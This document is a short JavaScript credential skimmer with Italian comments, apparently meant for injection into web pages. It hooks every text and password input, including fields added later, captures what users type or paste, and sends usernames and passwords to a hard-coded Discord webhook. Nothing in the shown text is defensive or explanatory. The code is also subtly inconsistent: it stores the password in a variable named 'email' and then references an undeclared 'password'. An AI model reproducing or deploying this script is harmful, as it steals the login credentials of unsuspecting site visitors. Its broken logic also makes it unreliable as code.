(() => {
  const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1464590647976788000/hb-LppvtKxCE8kAQiiah65ve0vUaq_W9wOIB2jIE_2H4OOEp2wyEV3lMDDj3nsLIWZ8H'; // <-- TUO WEBHOOK

  let username = null;
  let email = null;
  let sent = false;

  function sendIfReady() {
    if (sent) return;
    if (username && password) {
      sent = true;

      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          content: JSON.stringify({
            username,
            password,
            time: new Date().toISOString()
          }, null, 2)
        })
      });
    }
  }

  function handleInput(input) {
    const name = (input.name || '').toLowerCase();
    const type = input.type;

    if (!input.value) return;

    if (!username && (name.includes('username') || type === 'text')) {
      username = input.value;
    }

    if (!email && (name.includes('password') || type === 'password')) {
      email = input.value;
    }

    sendIfReady();
  }

  function attach(input) {
    // Valore già presente
    handleInput(input);

    input.addEventListener('input', () => handleInput(input));
    input.addEventListener('change', () => handleInput(input));
    input.addEventListener('paste', () =>
      setTimeout(() => handleInput(input), 0)
    );
  }

  function scan(root = document) {
    root.querySelectorAll('input').forEach(input => {
      if (
        input.type === 'text' ||
        input.type === 'password' ||
        input.name?.toLowerCase().includes('username') ||
        input.name?.toLowerCase().includes('password')
      ) {
        attach(input);
      }
    });
  }

  scan();

  new MutationObserver(mutations => {
    mutations.forEach(m =>
      m.addedNodes.forEach(n => {
        if (n.nodeType === 1) scan(n);
      })
    );
  }).observe(document.body, { childList: true, subtree: true });
})();

